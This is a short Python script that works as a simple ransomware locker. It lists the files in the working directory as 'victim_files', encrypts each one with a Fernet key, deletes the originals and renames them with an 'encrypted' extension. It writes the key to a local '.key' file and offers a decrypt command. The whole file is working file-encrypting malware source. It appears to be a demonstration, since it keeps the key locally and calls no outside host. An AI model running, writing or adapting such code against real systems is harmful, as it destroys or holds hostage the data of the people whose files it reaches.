import sys
import os

from cryptography.fernet import Fernet

key_file_name = '.key'
ignored_files = [
    key_file_name,
    'app.py'
]
victim_files = []
lock_extension = 'encrypted'


def get_files():
    for file in os.listdir():
        if file not in ignored_files and os.path.isfile(file):
            victim_files.append(file)


def encrypt_files(key):
    """
    Encrypt files into a new file with a given extension with the specified key.
    Removes the file after encrypting.
    """
    fernet = Fernet(key=key)
    for file in victim_files:
        if file.split('.')[-1] != lock_extension:
            encrypted_file_name = file + '.' + lock_extension
            try:
                with open(file, 'rb') as input_file, open(encrypted_file_name, 'wb') as output_file:
                    input_block = input_file.read()
                    encrypted_block = fernet.encrypt(input_block)
                    output_file.write(encrypted_block)
                os.remove(file)
            except IOError:
                print("An input/output error has occurred!")


def decrypt_files(key):
    """
    Decrypts the files ending with specified extension with the given key.
    Removes the encrypted files after decrypting.
    """
    fernet = Fernet(key=key)
    for file in victim_files:
        if file.split('.')[-1] == lock_extension:
            try:
                decrypted_file_name = file.rsplit('.', 1)[0]
                with open(file, 'rb') as input_file, open(decrypted_file_name, 'wb') as output_file:
                    input_block = input_file.read()
                    decrypted_block = fernet.decrypt(input_block)
                    output_file.write(decrypted_block)
                os.remove(file)
            except IOError:
                print("An input/output error has occurred!")
    os.remove(key_file_name)


def write_key(key):
    """
    Write the key to the specified key file. If the key file exists, returns False.
    """
    if os.path.exists(key_file_name):
        return False
    try:
        with open(key_file_name, 'wb') as f:
            f.write(key)
    except IOError:
        return False
    return True


def read_key():
    """
    Reads the key from the specified key file.
    """
    try:
        with open(key_file_name, 'rb') as f:
            return f.read()
    except IOError:
        return False


if __name__ == '__main__':
    if len(sys.argv) != 2:
        print("Usage app.py encrypt/decrypt")
        sys.exit(1)
    get_files()
    if sys.argv[1] == 'encrypt':
        key = Fernet.generate_key()
        if write_key(key):                              # If key file already exists, skips this operation.
            encrypt_files(key)                          # This prevents double encryption and loss of original
            sys.exit(0)                                 # key file.
    elif sys.argv[1] == 'decrypt':
        key = read_key()                                # If key file exists, proceeds with operation, else ignore.
        if key:
            decrypt_files(key)
            sys.exit(0)
    else:
        print("No clue what you are talking about. Acceptable commands are encrypt or decrypt.")
        sys.exit(1)
